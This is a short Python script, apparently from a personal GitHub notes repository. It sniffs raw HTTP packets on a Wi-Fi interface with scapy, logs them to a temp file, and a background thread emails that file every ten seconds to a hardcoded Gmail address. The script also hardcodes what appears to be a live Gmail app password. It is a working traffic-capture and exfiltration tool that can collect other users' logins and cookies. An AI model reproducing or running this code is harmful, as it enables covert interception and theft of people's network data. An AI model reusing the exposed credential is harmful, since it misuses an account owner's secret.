@@ -1,0 +1,79 @@
+https://github.com/sniperbytesdigital/notes/blob/e1c0b18c585b23fb1db6725a6ed32e22d2bb3d55/scapy1.txt
+#!/usr/bin/python
+#install scapy-http
+import threading
+import time
+
+import scapy.all as scapy #scapy and scapy-http
+from scapy.layers import http
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import tempfile
+import os
+
+temp_location = tempfile.gettempdir() #file_path=C:\Users\nairr\AppData\Local\Temp\data.txt
+file_path = os.path.join(temp_location, 'data.txt')
+obj = open(file_path, "a")
+obj.write(" ")
+obj.close()
+
+def sendmail() :
+    while True :
+        time.sleep(10)
+        sender_email = "sniperbytesofficial@gmail.com"
+        sender_password = "gqodlmvxciprjrja "  # Use app password, not regular password
+        receiver_email = "sniperbytesofficial@gmail.com"
+
+        # Create message
+        msg = MIMEMultipart()
+        msg["From"] = sender_email
+        msg["To"] = receiver_email
+        msg["Subject"] = "Email with Attachment"
+
+        # Email body
+        body = "Hi, please find the attached data.txt file."
+        msg.attach(MIMEText(body, "plain"))
+
+        # Attach file
+        filename = file_path
+        with open(filename, "rb") as attachment:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header(
+                "Content-Disposition",
+                f"attachment; filename= {filename}",
+            )
+            msg.attach(part)
+
+        # Send email
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.sendmail(sender_email, receiver_email, msg.as_string())
+            server.quit()
+            print("✅ Email sent successfully!")
+        except Exception as e:
+            print(f"❌ Error: {e}")
+
+obj = threading.Thread(target=sendmail)
+obj.start()
+
+#iface:interface, store:dont store data in PC, prn:for each packet captured call func()
+#filter: can use udp, tcp etc
+def sniff(interface) :
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def process_sniffed_packet(packet) :
+    if packet.haslayer(http.Raw) :   #http.TCP or UDP or HTTP, RAW -> ethernet layer
+        print(packet)
+        file_path = os.path.join(temp_location, 'data.txt')
+        obj = open(file_path, "a")
+        obj.write(str(packet))
+        obj.close()
+
+sniff("Wi-Fi")
